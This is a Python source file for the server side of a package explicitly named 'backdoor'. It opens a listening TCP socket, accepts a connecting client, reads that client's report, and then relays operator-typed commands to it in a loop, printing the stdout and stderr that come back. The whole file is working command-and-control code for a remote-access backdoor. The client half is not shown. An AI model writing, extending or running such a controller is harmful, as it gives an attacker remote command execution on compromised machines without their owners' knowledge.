# pyright: reportUnusedVariable=false
import socket

from backdoor.command.converter import InputToCommandConverter
from backdoor.messages.exchange.server import ServerExchangeMapper
from backdoor.messages.messenger import SocketMessenger
from backdoor.messages.protocol import SocketProtocol
from backdoor.models.client import ClientModel
from backdoor.models.commands import CommandResult
from backdoor.serialization.jsonserializer import JsonSerializer


class Server:

    def __init__(
        self,
        messenger: SocketMessenger,
        exchanger: ServerExchangeMapper,
        converter: InputToCommandConverter,
        host: str = "localhost",
        port: int = 4567,
    ) -> None:
        self.host = host
        self.port = port
        self.messenger = messenger
        self.exchanger = exchanger
        self.converter = converter
        self.socket = self.__create_socket(host, port)
        self.ps1 = ">>> "

    def start(self) -> None:
        client = self.__accept_connection()
        self.__read_client_report(client)

        inp = ""
        while inp != "exit":
            inp = self.__get_input()
            command = self.converter.convert(inp)

            result = self.exchanger.exchange(client, command)

            self.__print_result(result)

    def __print_result(self, result: CommandResult) -> None:
        output = f'{result.stdout or ""}{result.stderr or ""}'.strip()
        print(output)

    def __accept_connection(self) -> ClientModel:
        sock, addr = self.socket.accept()
        host, port = addr
        return ClientModel(**locals())

    def __read_client_report(self, client: ClientModel) -> None:
        report = self.messenger.receive(client.sock)
        client.report = report

    def __get_input(self) -> str:
        while not (inp := input(self.ps1).strip()):
            ...
        return inp

    def __create_socket(self, host: str, port: int) -> socket.socket:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((host, port))
        sock.listen(0)
        return sock


def main() -> None:
    protocol = SocketProtocol()
    serializer = JsonSerializer()
    messenger = SocketMessenger(protocol, serializer)
    exchanger = ServerExchangeMapper(messenger)
    converter = InputToCommandConverter()
    server = Server(messenger, exchanger, converter)

    server.start()


if __name__ == "__main__":
    main()
